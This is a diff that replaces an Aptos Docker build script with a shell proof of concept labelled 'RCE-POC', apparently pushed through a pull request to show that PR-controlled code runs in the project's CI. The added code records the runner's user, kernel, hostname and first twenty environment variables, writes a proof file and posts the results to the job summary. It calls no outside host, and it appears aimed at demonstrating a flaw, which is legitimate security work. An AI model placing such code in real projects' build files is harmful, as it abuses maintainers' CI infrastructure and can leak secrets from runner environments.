@@ -1,11 +1,25 @@
-#!/bin/bash
-# Copyright © Aptos Foundation
-# SPDX-License-Identifier: Apache-2.0
+#!/usr/bin/env bash
+set -euxo pipefail
 
-# This script is meant to build the rosetta docker image.
-# Run it via `docker/rosetta/docker-build-rosetta.sh`
-set -ex
+echo "[RCE-POC] Hello from PR"
+echo "[RCE-POC] whoami=$(whoami)"
+echo "[RCE-POC] uname=$(uname -a)"
+echo "[RCE-POC] hostname=$(cat /etc/hostname || true)"
 
-export GIT_REPO="${GIT_REPO:-https://github.com/aptos-labs/aptos-core.git}"
-export GIT_REF="${GIT_REF:-$(git rev-parse HEAD)}"
-docker buildx build --file docker/rosetta/rosetta.Dockerfile --build-arg=GIT_REPO=$GIT_REPO --build-arg=GIT_REF=$GIT_REF -t aptos-core:rosetta-$GIT_REF -t aptos-core:rosetta-latest --load .
+# Create a proof file in the runner workspace
+echo "PR-controlled code ran at $(date) on run $GITHUB_RUN_ID" > RCE_PROOF.txt
+ls -la RCE_PROOF.txt
+
+# Add a visible summary in the GitHub job UI
+{
+  echo "### RCE PoC"
+  echo "- Ran as: \`$(whoami)\`"
+  echo "- Hostname: \`$(cat /etc/hostname || echo n/a)\`"
+  echo "- Created file: \`$PWD/RCE_PROOF.txt\`"
+} >> "$GITHUB_STEP_SUMMARY"
+
+# Optional: show some benign env vars
+env | head -n 20
+
+# IMPORTANT: do NOT invoke docker here
+echo "[RCE-POC] Done."
